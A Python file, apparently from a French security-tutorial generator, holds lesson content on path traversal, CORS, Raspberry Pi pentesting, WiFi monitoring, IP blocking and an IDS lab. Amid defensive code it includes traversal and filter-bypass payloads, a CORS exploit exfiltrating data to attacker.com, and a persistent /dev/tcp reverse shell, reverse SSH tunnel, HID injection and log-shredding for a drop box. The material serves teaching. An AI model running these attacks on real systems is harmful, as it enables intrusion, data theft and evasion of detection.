#!/usr/bin/env python3
"""
Contenu additionnel pour les repos manquants
"""

ADDITIONAL_CONTENT = {
    "Python.Traversal.Vulnerabilities": {
        "title": "Path Traversal - Vulnérabilités et Exploitation",
        "intro": """
## Introduction

Le **Path Traversal** (ou Directory Traversal) est une vulnérabilité web permettant à un attaquant d'accéder à des fichiers en dehors du répertoire prévu par l'application.

### Impact potentiel

- Lecture de fichiers sensibles (`/etc/passwd`, `.env`, `config.php`)
- Accès aux logs et données utilisateurs
- Parfois exécution de code via inclusion de fichiers
""",
        "theory": """
## Théorie et Concepts

### Comment fonctionne le Path Traversal ?

```
Requête normale:
GET /download?file=rapport.pdf
→ /var/www/uploads/rapport.pdf

Requête malveillante:
GET /download?file=../../../etc/passwd
→ /var/www/uploads/../../../etc/passwd
→ /etc/passwd
```

### Séquences d'échappement courantes

| Séquence | Encodage URL | Description |
|----------|--------------|-------------|
| `../` | `%2e%2e%2f` | Remonte d'un niveau |
| `..\\` | `%2e%2e%5c` | Windows |
| `....//` | - | Double encoding bypass |
| `..%252f` | - | Double URL encode |
| `%c0%ae%c0%ae/` | - | UTF-8 overlong |

### Fichiers cibles courants

**Linux:**
```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
~/.ssh/id_rsa
```

**Windows:**
```
C:\\Windows\\win.ini
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\inetpub\\logs\\LogFiles\\
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Détection de vulnérabilités

```python
import requests

def test_path_traversal(url, param):
    payloads = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..%2f..%2f..%2fetc/passwd',
        '..%252f..%252f..%252fetc/passwd',
        '/etc/passwd',
        '....\\\\....\\\\....\\\\windows\\\\win.ini',
    ]

    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        r = requests.get(test_url)

        # Indicateurs de succès
        if 'root:' in r.text or '[fonts]' in r.text:
            print(f"[VULN] {payload}")
            return True

    return False

# test_path_traversal('http://target/download', 'file')
```

### 2. Protection en Python

```python
import os
from pathlib import Path

UPLOAD_DIR = Path('/var/www/uploads').resolve()

def secure_file_access(filename):
    # Nettoyer le nom de fichier
    safe_name = os.path.basename(filename)

    # Construire le chemin
    file_path = (UPLOAD_DIR / safe_name).resolve()

    # Vérifier que le chemin est dans le répertoire autorisé
    if not str(file_path).startswith(str(UPLOAD_DIR)):
        raise SecurityError("Tentative de path traversal détectée")

    if not file_path.exists():
        raise FileNotFoundError()

    return file_path

# Flask exemple
@app.route('/download')
def download():
    filename = request.args.get('file', '')
    try:
        path = secure_file_access(filename)
        return send_file(path)
    except SecurityError:
        abort(403)
```

### 3. Bypass de filtres

```python
# Si le serveur filtre '../'
def generate_bypass_payloads(target_file):
    return [
        f'....//....//..../{target_file}',  # Double
        f'..././..././{target_file}',        # Nested
        f'..%2f..%2f{target_file}',          # URL encode
        f'..%252f..%252f{target_file}',      # Double encode
        f'..\\..\\{target_file}',            # Backslash
        f'/....//..../{target_file}',        # Absolute + bypass
    ]
```
""",
        "best_practices": """
## Bonnes Pratiques

### Validation stricte

```python
import re
import os

def validate_filename(filename):
    # 1. Whitelist de caractères
    if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
        return False

    # 2. Pas de séquences dangereuses
    dangerous = ['..', '/', '\\\\', '%', '\\x00']
    for seq in dangerous:
        if seq in filename:
            return False

    # 3. Extension autorisée
    allowed_ext = {'.pdf', '.png', '.jpg', '.txt'}
    ext = os.path.splitext(filename)[1].lower()
    if ext not in allowed_ext:
        return False

    return True
```

### Architecture sécurisée

```
/var/www/
├── app/           # Code application (non accessible)
├── uploads/       # Fichiers utilisateurs
│   └── .htaccess  # Deny from all
└── public/        # Seul répertoire accessible
    └── index.php
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Filtrage insuffisant

```python
# MAUVAIS - Remplace une seule fois
filename = filename.replace('../', '')
# Bypass: '....//etc/passwd' → '../etc/passwd'

# BON - Boucle jusqu'à suppression complète
while '../' in filename or '..\\\\'in filename:
    filename = filename.replace('../', '').replace('..\\\\', '')
```

### ❌ Vérification après manipulation

```python
# MAUVAIS - Check avant normalisation
if '..' not in filename:
    path = os.path.join(base, filename)  # VULN!

# BON - Check après résolution
path = os.path.realpath(os.path.join(base, filename))
if not path.startswith(os.path.realpath(base)):
    raise SecurityError()
```
""",
        "tools": """
## Outils de Test

### Automatisation avec ffuf

```bash
# Wordlist de path traversal
ffuf -u "http://target/read?file=FUZZ" \\
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\
     -mc 200 -fs 0
```

### Burp Suite Intruder

1. Capturer la requête avec le paramètre fichier
2. Envoyer à Intruder
3. Charger une wordlist LFI/Path Traversal
4. Analyser les réponses de taille différente
""",
        "references": """
## Références

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

### Classification
- **CWE-22** : Improper Limitation of a Pathname to a Restricted Directory
- **OWASP Top 10** : A01:2021 - Broken Access Control
"""
    },

    "Python.CORS.Handler": {
        "title": "CORS - Cross-Origin Resource Sharing",
        "intro": """
## Introduction

**CORS (Cross-Origin Resource Sharing)** est un mécanisme de sécurité du navigateur qui contrôle les requêtes HTTP cross-origin. Une mauvaise configuration CORS peut exposer des APIs à des attaques.

### Qu'est-ce qu'une origine ?

```
https://example.com:443/path
└─┬─┘   └────┬────┘└─┬┘
scheme    host     port
```

Deux URLs ont la même origine si scheme, host ET port sont identiques.
""",
        "theory": """
## Théorie et Concepts

### Fonctionnement de CORS

```
1. Requête simple (GET/POST avec Content-Type standard)
   Browser → Server: GET /api/data
   Server → Browser: Access-Control-Allow-Origin: *

2. Requête préflight (PUT/DELETE/custom headers)
   Browser → Server: OPTIONS /api/data
   Server → Browser: Access-Control-Allow-Methods: PUT, DELETE
   Browser → Server: PUT /api/data (si autorisé)
```

### Headers CORS importants

| Header | Description |
|--------|-------------|
| `Access-Control-Allow-Origin` | Origines autorisées |
| `Access-Control-Allow-Credentials` | Autorise cookies |
| `Access-Control-Allow-Methods` | Méthodes HTTP permises |
| `Access-Control-Allow-Headers` | Headers custom permis |
| `Access-Control-Expose-Headers` | Headers lisibles par JS |

### Configurations dangereuses

```python
# DANGER : Accepte toutes les origines AVEC credentials
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# ↑ Navigateurs bloquent cette combo, mais...

# DANGER : Reflète l'origine sans validation
origin = request.headers.get('Origin')
response.headers['Access-Control-Allow-Origin'] = origin
response.headers['Access-Control-Allow-Credentials'] = 'true'
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Configuration CORS sécurisée (Flask)

```python
from flask import Flask, request
from functools import wraps

app = Flask(__name__)

ALLOWED_ORIGINS = {
    'https://app.example.com',
    'https://admin.example.com',
}

def cors_handler(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        origin = request.headers.get('Origin')

        # Vérifier si l'origine est autorisée
        if origin in ALLOWED_ORIGINS:
            response = f(*args, **kwargs)
            response.headers['Access-Control-Allow-Origin'] = origin
            response.headers['Access-Control-Allow-Credentials'] = 'true'
            response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
            response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
            return response

        return f(*args, **kwargs)
    return decorated

@app.route('/api/data', methods=['GET', 'OPTIONS'])
@cors_handler
def api_data():
    if request.method == 'OPTIONS':
        return '', 204
    return {'data': 'sensitive'}
```

### 2. Test de misconfiguration CORS

```python
import requests

def test_cors_misconfig(url):
    test_origins = [
        'https://evil.com',
        'https://attacker.com',
        'null',
        'https://example.com.evil.com',  # Subdomain trick
    ]

    for origin in test_origins:
        headers = {'Origin': origin}
        r = requests.get(url, headers=headers)

        acao = r.headers.get('Access-Control-Allow-Origin', '')
        acac = r.headers.get('Access-Control-Allow-Credentials', '')

        if origin in acao or acao == '*':
            vuln = 'CRITICAL' if acac == 'true' else 'MEDIUM'
            print(f"[{vuln}] Origin '{origin}' reflected")
            print(f"  ACAO: {acao}")
            print(f"  ACAC: {acac}")

# test_cors_misconfig('https://api.target.com/user/profile')
```

### 3. Exploitation CORS

```html
<!-- Page de l'attaquant -->
<script>
fetch('https://vulnerable-api.com/user/data', {
    credentials: 'include'  // Envoie les cookies
})
.then(r => r.json())
.then(data => {
    // Exfiltrer les données
    fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
</script>
```
""",
        "best_practices": """
## Bonnes Pratiques

### Whitelist stricte

```python
# Validation avec regex pour sous-domaines
import re

ORIGIN_PATTERN = re.compile(
    r'^https://([a-z0-9-]+\\.)?example\\.com$'
)

def is_valid_origin(origin):
    return bool(ORIGIN_PATTERN.match(origin))
```

### Headers de sécurité complémentaires

```python
@app.after_request
def security_headers(response):
    # Empêcher le framing
    response.headers['X-Frame-Options'] = 'DENY'

    # Politique de contenu
    response.headers['Content-Security-Policy'] = "default-src 'self'"

    # Pas de sniffing MIME
    response.headers['X-Content-Type-Options'] = 'nosniff'

    return response
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Reflection d'origine

```python
# MAUVAIS
@app.after_request
def cors(response):
    response.headers['ACAO'] = request.headers.get('Origin')
    return response

# BON
@app.after_request
def cors(response):
    origin = request.headers.get('Origin')
    if origin in WHITELIST:
        response.headers['ACAO'] = origin
    return response
```

### ❌ Wildcard avec credentials

```python
# INTERDIT par les navigateurs mais parfois tenté
headers['Access-Control-Allow-Origin'] = '*'
headers['Access-Control-Allow-Credentials'] = 'true'
```
""",
        "tools": """
## Outils

### CORScanner

```bash
python cors_scan.py -u https://target.com/api/
```

### Burp Suite

1. Proxy > Options > Match and Replace
2. Ajouter un header Origin malveillant
3. Observer les réponses ACAO
""",
        "references": """
## Références

- [MDN CORS](https://developer.mozilla.org/fr/docs/Web/HTTP/CORS)
- [PortSwigger CORS](https://portswigger.net/web-security/cors)
- [OWASP CORS](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)
"""
    },

    "Raspberry.Hack": {
        "title": "Raspberry Pi - Plateforme de Hacking",
        "intro": """
## Introduction

Le **Raspberry Pi** est une plateforme idéale pour le pentesting et la sécurité offensive grâce à sa taille réduite, son faible coût et sa compatibilité Linux.

### Pourquoi le Raspberry Pi ?

- **Discret** : Petit, silencieux, facile à dissimuler
- **Low-cost** : Accessible pour les budgets limités
- **Polyvalent** : Linux complet, GPIO, USB gadget mode
- **Communauté** : Documentation et outils abondants
""",
        "theory": """
## Théorie et Concepts

### Distributions recommandées

| Distribution | Usage | Spécificités |
|--------------|-------|--------------|
| Kali Linux ARM | Pentest complet | Tous les outils Kali |
| P4wnP1 A.L.O.A. | Attaques USB | HID, network, mass storage |
| Raspberry Pi OS | Base personnalisée | Léger, personnalisable |

### Cas d'usage en pentest

```
┌─────────────────────────────────────────────────┐
│                 DROP BOX                         │
│  Pi laissé sur le réseau cible                  │
│  - Reverse shell persistant                      │
│  - Scan du réseau interne                        │
│  - Pivot point pour attaquant distant           │
└─────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────┐
│                 EVIL USB                         │
│  Pi Zero en USB gadget mode                     │
│  - Émule clavier (HID injection)                │
│  - Émule carte réseau (network tap)             │
│  - Exfiltre données (mass storage)              │
└─────────────────────────────────────────────────┘
```

### USB Gadget Mode (Pi Zero)

Le Pi Zero peut émuler différents périphériques USB :

- **HID** : Clavier/souris pour injection de commandes
- **ECM/RNDIS** : Interface réseau pour MITM
- **Mass Storage** : Clé USB pour exfiltration
- **Serial** : Port série pour debug
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Configuration P4wnP1

```bash
# Installation
git clone https://github.com/RoganDawes/P4wnP1_aloa
cd P4wnP1_aloa
./install.sh

# Configuration HID attack
cat > /usr/local/P4wnP1/HIDScripts/payload.js << 'EOF'
// Ouvre un terminal et exécute une commande
layout('fr');
delay(1000);
press('GUI r');
delay(500);
type('cmd');
delay(500);
press('RETURN');
delay(1000);
type('whoami > C:\\\\temp\\\\pwned.txt');
press('RETURN');
EOF
```

### 2. Drop Box avec reverse shell

```bash
#!/bin/bash
# Script au démarrage pour connexion persistante

ATTACKER_IP="attacker.com"
ATTACKER_PORT="4444"

while true; do
    # Tente de se connecter
    bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1

    # Attendre avant de réessayer
    sleep 60
done
```

### 3. Configuration réseau discrète

```bash
# Connexion WiFi automatique
cat >> /etc/wpa_supplicant/wpa_supplicant.conf << EOF
network={
    ssid="TargetWiFi"
    psk="password"
    priority=1
}
EOF

# Reverse SSH tunnel persistant
autossh -M 0 -o "ServerAliveInterval 30" \\
    -R 2222:localhost:22 user@attacker.com
```

### 4. Alimentation discrète

```bash
# Options d'alimentation
# - Power over Ethernet (PoE hat)
# - Batterie USB (powerbank)
# - Prise murale USB (chargeur)
# - Solaire (usage extérieur)

# Réduire consommation
echo 1 > /sys/class/leds/led0/brightness  # Éteindre LED
tvservice -o  # Désactiver HDMI
```
""",
        "best_practices": """
## Bonnes Pratiques

### Sécurisation du Pi

```bash
# Chiffrement du disque (LUKS)
cryptsetup luksFormat /dev/mmcblk0p2
cryptsetup open /dev/mmcblk0p2 cryptroot

# Auto-destruction si capture
# Script déclenché par:
# - Mot de passe incorrect x3
# - Absence de beacon WiFi
# - Bouton physique
```

### Effacement des traces

```bash
#!/bin/bash
# Nettoyage avant extraction

# Logs
shred -u /var/log/*
history -c

# Fichiers temporaires
rm -rf /tmp/*

# Metadata réseau
ip link set wlan0 down
macchanger -r wlan0
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Laisser les identifiants par défaut

```bash
# TOUJOURS changer
passwd pi
sudo passwd root
```

### ❌ Connexion directe sans tunnel

```bash
# MAUVAIS : Connexion SSH directe
ssh pi@target-network-pi

# BON : Tunnel via serveur externe
ssh -J relay@relay-server pi@internal-pi
```
""",
        "tools": """
## Outils Recommandés

### Matériel

- **Antenne WiFi externe** : Alfa AWUS036ACH
- **Batterie** : Anker PowerCore 10000
- **Boîtier discret** : Impression 3D custom
- **GPS** : Module USB pour wardriving

### Logiciels

```bash
# Installation des outils essentiels
apt install nmap masscan aircrack-ng \\
    responder impacket-scripts \\
    proxychains tor
```
""",
        "references": """
## Références

- [P4wnP1 Documentation](https://github.com/RoganDawes/P4wnP1_aloa)
- [Kali ARM](https://www.kali.org/docs/arm/)
- [Raspberry Pi Security](https://www.raspberrypi.org/documentation/configuration/security.md)
"""
    },

    "Python.PiZero.WiFi": {
        "title": "Raspberry Pi Zero - Boîte à Outils WiFi",
        "intro": """
## Introduction

Ce projet transforme un **Raspberry Pi Zero W** en station de monitoring WiFi portable pour l'analyse de réseaux sans fil.

### Fonctionnalités

- Scan des réseaux WiFi environnants
- Capture de handshakes WPA
- Détection d'attaques de deauthentification
- Dashboard web temps réel
- Alertes Telegram
""",
        "theory": """
## Théorie et Concepts

### Mode Monitor

Le mode monitor permet de capturer TOUS les paquets WiFi, pas seulement ceux destinés à notre interface.

```
Mode Managed (normal):
[AP] ←────→ [Client]
     └──── [Pi] (ne voit rien)

Mode Monitor:
[AP] ←────→ [Client]
     └────→ [Pi] (voit tout)
```

### Types de trames 802.11

| Type | Exemples | Intérêt sécurité |
|------|----------|------------------|
| Management | Beacon, Probe, Auth, Deauth | Attaques deauth, evil twin |
| Control | ACK, RTS, CTS | Timing attacks |
| Data | Data, QoS | Capture de trafic |

### Handshake WPA/WPA2

```
Client                                   AP
  │                                      │
  │◄─────── 1. ANonce ──────────────────│
  │                                      │
  │──────── 2. SNonce + MIC ───────────►│
  │         (PTK calculé)                │
  │                                      │
  │◄─────── 3. GTK + MIC ───────────────│
  │                                      │
  │──────── 4. ACK ────────────────────►│
  │                                      │

Pour cracker: Il faut capturer les messages 1-2 ou 2-3
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Activation mode monitor

```bash
# Vérifier support
iw list | grep -i monitor

# Activer avec airmon-ng
airmon-ng start wlan0

# Ou manuellement
ip link set wlan0 down
iw wlan0 set type monitor
ip link set wlan0 up

# Vérifier
iw wlan0 info | grep type
```

### 2. Scanner les réseaux (Python/Scapy)

```python
from scapy.all import *
from collections import defaultdict

networks = defaultdict(dict)

def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')

        try:
            stats = pkt[Dot11Beacon].network_stats()
            channel = stats.get('channel')
            crypto = stats.get('crypto')
        except:
            channel = None
            crypto = set()

        networks[bssid] = {
            'ssid': ssid,
            'channel': channel,
            'crypto': crypto,
            'signal': pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else None
        }

        print(f"[{bssid}] {ssid:20} Ch:{channel} {crypto}")

# Sniff sur interface monitor
sniff(iface='wlan0mon', prn=packet_handler, store=False)
```

### 3. Capture de handshake

```python
from scapy.all import *

handshakes = {}

def capture_eapol(pkt):
    if pkt.haslayer(EAPOL):
        bssid = pkt[Dot11].addr1 if pkt[Dot11].addr1 != pkt[Dot11].addr2 else pkt[Dot11].addr3

        if bssid not in handshakes:
            handshakes[bssid] = []

        handshakes[bssid].append(pkt)

        if len(handshakes[bssid]) >= 2:
            print(f"[+] Handshake capturé pour {bssid}")
            wrpcap(f'handshake_{bssid.replace(":", "")}.pcap', handshakes[bssid])

sniff(iface='wlan0mon', prn=capture_eapol, store=False)
```

### 4. Détection d'attaques deauth

```python
from scapy.all import *
import time

deauth_count = defaultdict(int)

def detect_deauth(pkt):
    if pkt.haslayer(Dot11Deauth):
        src = pkt[Dot11].addr2
        dst = pkt[Dot11].addr1

        deauth_count[src] += 1

        if deauth_count[src] > 10:
            print(f"[ALERT] Deauth attack from {src} ({deauth_count[src]} packets)")
            # Envoyer alerte Telegram
            send_telegram_alert(f"Deauth attack detected from {src}")

sniff(iface='wlan0mon', prn=detect_deauth, store=False)
```

### 5. Dashboard Flask

```python
from flask import Flask, render_template, jsonify

app = Flask(__name__)

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/networks')
def api_networks():
    return jsonify(list(networks.values()))

@app.route('/api/alerts')
def api_alerts():
    return jsonify(alerts)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```
""",
        "best_practices": """
## Bonnes Pratiques

### Chipsets WiFi recommandés

```
Supportent mode monitor + injection:
- Atheros AR9271 (TP-Link TL-WN722N v1)
- Realtek RTL8812AU (Alfa AWUS036ACH)
- Ralink RT3070 (Alfa AWUS036NH)

NE supportent PAS:
- Chipsets Intel intégrés
- Broadcom (sans patches)
- Realtek récents (RTL8188)
```

### Sécurité du Pi

```python
# Authentification dashboard
from flask_httpauth import HTTPBasicAuth
from werkzeug.security import check_password_hash

auth = HTTPBasicAuth()

@auth.verify_password
def verify(username, password):
    if username == 'admin':
        return check_password_hash(ADMIN_HASH, password)
    return False

@app.route('/api/sensitive')
@auth.login_required
def sensitive():
    return jsonify(data)
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Oublier de changer de canal

```bash
# Scanner tous les canaux
for chan in {1..14}; do
    iw wlan0mon set channel $chan
    sleep 2
done
```

### ❌ Interférence avec NetworkManager

```bash
# Arrêter les services qui interfèrent
airmon-ng check kill

# Ou manuellement
systemctl stop NetworkManager
systemctl stop wpa_supplicant
```
""",
        "tools": """
## Outils

### Python
- **Scapy** : Manipulation de paquets
- **pyshark** : Wrapper tshark
- **wifi** : Gestion WiFi

### CLI
```bash
airmon-ng    # Mode monitor
airodump-ng  # Scan réseaux
aireplay-ng  # Injection paquets
aircrack-ng  # Crack handshakes
```
""",
        "references": """
## Références

- [Scapy WiFi](https://scapy.readthedocs.io/en/latest/layers/dot11.html)
- [Aircrack-ng Docs](https://www.aircrack-ng.org/documentation.html)
- [802.11 Frame Types](https://en.wikipedia.org/wiki/802.11_Frame_Types)
"""
    },

    "Raspberry.IpBlocker": {
        "title": "Blocage Automatique d'IP Malveillantes",
        "intro": """
## Introduction

Système de défense automatisé utilisant **iptables**, **fail2ban** et des threat feeds pour bloquer les IP malveillantes en temps réel.

### Composants

- **iptables/nftables** : Firewall Linux
- **fail2ban** : Détection d'intrusion sur logs
- **ipset** : Gestion efficace de listes d'IP
- **Threat feeds** : Listes d'IP malveillantes
""",
        "theory": """
## Théorie et Concepts

### Architecture de défense

```
┌─────────────────────────────────────────────────────┐
│                    INTERNET                          │
└─────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────┐
│                   IPTABLES                           │
│  ┌─────────┐   ┌─────────┐   ┌─────────┐           │
│  │ ipset   │   │ fail2ban│   │ custom  │           │
│  │ threat  │   │ jails   │   │ rules   │           │
│  └─────────┘   └─────────┘   └─────────┘           │
└─────────────────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────┐
│                   SERVICES                           │
│         SSH    │    HTTP    │    Custom              │
└─────────────────────────────────────────────────────┘
```

### iptables vs ipset

| Approche | Performance | Usage |
|----------|-------------|-------|
| iptables règles multiples | O(n) | < 100 IPs |
| ipset hash | O(1) | > 1000 IPs |

```bash
# LENT : 10000 règles iptables
iptables -A INPUT -s 1.2.3.4 -j DROP
iptables -A INPUT -s 1.2.3.5 -j DROP
# ... x10000

# RAPIDE : 1 règle + ipset
ipset create blacklist hash:ip
ipset add blacklist 1.2.3.4
# ... x10000
iptables -A INPUT -m set --match-set blacklist src -j DROP
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Configuration ipset

```bash
# Créer un set pour les IP malveillantes
ipset create blacklist hash:ip hashsize 4096 maxelem 100000

# Ajouter des IPs
ipset add blacklist 192.168.1.100
ipset add blacklist 10.0.0.0/8  # Supporte les CIDR

# Lister le contenu
ipset list blacklist

# Sauvegarder
ipset save > /etc/ipset.conf

# Restaurer au boot
ipset restore < /etc/ipset.conf
```

### 2. Intégration iptables

```bash
# Créer la règle de blocage
iptables -I INPUT -m set --match-set blacklist src -j DROP
iptables -I FORWARD -m set --match-set blacklist src -j DROP

# Ajouter le logging avant DROP
iptables -I INPUT -m set --match-set blacklist src -j LOG \\
    --log-prefix "BLOCKED: " --log-level 4

# Persister les règles
iptables-save > /etc/iptables/rules.v4
```

### 3. Configuration fail2ban

```ini
# /etc/fail2ban/jail.local

[DEFAULT]
bantime = 1h
findtime = 10m
maxretry = 3
banaction = iptables-ipset-proto6

[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3

[nginx-http-auth]
enabled = true
filter = nginx-http-auth
logpath = /var/log/nginx/error.log
maxretry = 5

[custom-api]
enabled = true
port = 8080
filter = custom-api
logpath = /var/log/api/access.log
maxretry = 10
findtime = 1m
bantime = 30m
```

### 4. Script de mise à jour automatique

```python
#!/usr/bin/env python3
import requests
import subprocess

THREAT_FEEDS = [
    'https://www.abuseipdb.com/blacklist/ip',
    'https://rules.emergingthreats.net/fwrules/emerging-Block-IPs.txt',
]

def update_blacklist():
    ips = set()

    for feed in THREAT_FEEDS:
        try:
            r = requests.get(feed, timeout=30)
            for line in r.text.splitlines():
                line = line.strip()
                if line and not line.startswith('#'):
                    ips.add(line.split()[0])
        except Exception as e:
            print(f"Erreur feed {feed}: {e}")

    print(f"IPs collectées: {len(ips)}")

    # Recréer le set
    subprocess.run(['ipset', 'flush', 'threat-feed'])

    for ip in ips:
        subprocess.run(['ipset', 'add', 'threat-feed', ip, '-exist'])

    print("Blacklist mise à jour")

if __name__ == '__main__':
    update_blacklist()
```

### 5. Cron pour mise à jour

```bash
# /etc/cron.d/threat-feeds
0 */6 * * * root /opt/scripts/update_blacklist.py >> /var/log/threat-feed.log 2>&1
```
""",
        "best_practices": """
## Bonnes Pratiques

### Rate limiting

```bash
# Limiter les nouvelles connexions SSH
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \\
    -m recent --set --name SSH

iptables -A INPUT -p tcp --dport 22 -m state --state NEW \\
    -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP
```

### Whitelist avant blacklist

```bash
# Ordre des règles
iptables -A INPUT -m set --match-set whitelist src -j ACCEPT
iptables -A INPUT -m set --match-set blacklist src -j DROP
iptables -A INPUT -j ACCEPT
```

### Alerting

```python
import smtplib
from email.mime.text import MIMEText

def alert_on_block(ip, reason):
    msg = MIMEText(f"IP {ip} bloquée: {reason}")
    msg['Subject'] = f'[SECURITY] IP Blocked: {ip}'
    msg['From'] = 'security@example.com'
    msg['To'] = 'admin@example.com'

    with smtplib.SMTP('localhost') as s:
        s.send_message(msg)
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Se bloquer soi-même

```bash
# TOUJOURS whitelister son IP avant
ipset add whitelist VOTRE_IP

# Ou règle iptables prioritaire
iptables -I INPUT -s VOTRE_IP -j ACCEPT
```

### ❌ Règles non persistantes

```bash
# Les règles iptables sont perdues au reboot!
# Installer iptables-persistent
apt install iptables-persistent

# Sauvegarder manuellement
netfilter-persistent save
```
""",
        "tools": """
## Outils

### fail2ban-client

```bash
# Status
fail2ban-client status
fail2ban-client status sshd

# Débannir une IP
fail2ban-client set sshd unbanip 192.168.1.100

# Bannir manuellement
fail2ban-client set sshd banip 192.168.1.100
```

### Sources de threat intel

- [AbuseIPDB](https://www.abuseipdb.com/)
- [Emerging Threats](https://rules.emergingthreats.net/)
- [Shodan](https://www.shodan.io/)
- [GreyNoise](https://www.greynoise.io/)
""",
        "references": """
## Références

- [fail2ban Documentation](https://www.fail2ban.org/wiki/index.php/Main_Page)
- [ipset Manual](https://ipset.netfilter.org/ipset.man.html)
- [iptables Tutorial](https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html)
"""
    },

    "Rust.Nmap.Network": {
        "title": "Laboratoire IDS - Snort, Suricata et Zeek",
        "intro": """
## Introduction

Laboratoire complet pour tester et comparer les trois principaux **IDS (Intrusion Detection Systems)** open source : Snort, Suricata et Zeek.

### Objectifs

- Comprendre les différences entre les IDS
- Tester l'évasion de détection
- Apprendre à écrire des règles custom
- Comparer les performances
""",
        "theory": """
## Théorie et Concepts

### Comparaison des IDS

| Caractéristique | Snort | Suricata | Zeek |
|-----------------|-------|----------|------|
| Type | Signature | Signature | Comportemental |
| Multi-threading | Non (v2) | Oui | Oui |
| Protocoles | Deep inspection | Deep inspection | Parsing natif |
| Logs | Unified2, syslog | EVE JSON | Logs structurés |
| Règles | Snort rules | Snort compatible | Scripts Zeek |

### Architecture du lab

```
┌─────────────────────────────────────────────────────┐
│                   COMMANDER (Rust)                   │
│              Dashboard + Contrôle                    │
│                   Port 3000                          │
└─────────────────────────────────────────────────────┘
         │              │              │
         ▼              ▼              ▼
┌─────────────┐  ┌─────────────┐  ┌─────────────┐
│   SNORT     │  │  SURICATA   │  │    ZEEK     │
│  Container  │  │  Container  │  │  Container  │
│             │  │  + EveBox   │  │             │
└─────────────┘  └─────────────┘  └─────────────┘
         │              │              │
         └──────────────┼──────────────┘
                        │
                        ▼
              ┌─────────────────┐
              │  TARGET (nginx) │
              │   Container     │
              └─────────────────┘
```

### Niveaux de sécurité

| Niveau | Nom | Description |
|--------|-----|-------------|
| 1 | Minimal | Détecte seulement les attaques évidentes |
| 2 | Basic | Ajoute détection de scans basiques |
| 3 | Moderate | Détection timing et patterns |
| 4 | Strict | Détection fragmentation |
| 5 | Paranoid | Tout trafic anormal alerté |
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Démarrage du laboratoire

```bash
# Cloner et démarrer
git clone https://github.com/venantvr-security/Rust.Nmap.Network
cd Rust.Nmap.Network

# Démarrer tous les labs
./start_all_labs.sh

# Ou individuellement
cd snort-lab && docker compose up -d
cd suricata-lab && docker compose up -d
cd zeek-lab && docker compose up -d
```

### 2. Test de détection basique

```bash
# Scan détecté par tous les IDS
nmap -sS -p 80,443 target

# Vérifier les alertes
docker logs snort-lab_snort_1 | grep ALERT
```

### 3. Techniques d'évasion Nmap

```bash
# Fragmentation IP (-f)
nmap -f target
nmap -f -f target  # Fragments plus petits
nmap --mtu 24 target

# Timing lent (-T0 paranoid)
nmap -T0 -p 80 target

# Decoys (leurres)
nmap -D RND:10 target
nmap -D decoy1,decoy2,ME target

# Source port (DNS)
nmap --source-port 53 target

# Combinaison
nmap -f -T2 -D RND:5 --source-port 53 target
```

### 4. Écriture de règles Snort/Suricata

```
# Règle basique
alert tcp any any -> $HOME_NET 80 (msg:"Web scan";
    content:"GET"; http_method;
    threshold:type threshold, track by_src, count 10, seconds 60;
    sid:1000001; rev:1;)

# Détection de fragmentation
alert ip any any -> $HOME_NET any (msg:"IP Fragmentation";
    fragbits:M;
    sid:1000002; rev:1;)

# Détection scan NULL
alert tcp any any -> $HOME_NET any (msg:"NULL Scan";
    flags:0;
    sid:1000003; rev:1;)
```

### 5. Script Zeek custom

```zeek
# detect_scans.zeek
@load base/frameworks/notice

module ScanDetection;

export {
    redef enum Notice::Type += {
        Port_Scan_Detected
    };

    const scan_threshold = 15 &redef;
    const scan_interval = 1min &redef;
}

global scan_attempts: table[addr] of count &default=0;

event connection_attempt(c: connection)
{
    local scanner = c$id$orig_h;
    ++scan_attempts[scanner];

    if (scan_attempts[scanner] > scan_threshold)
    {
        NOTICE([
            $note=Port_Scan_Detected,
            $msg=fmt("Port scan from %s", scanner),
            $src=scanner
        ]);
    }
}
```
""",
        "best_practices": """
## Bonnes Pratiques

### Tuning des règles

```bash
# Désactiver les règles bruyantes
# /etc/suricata/disable.conf
1:2100498
1:2100499

# Modifier les seuils
# /etc/suricata/threshold.config
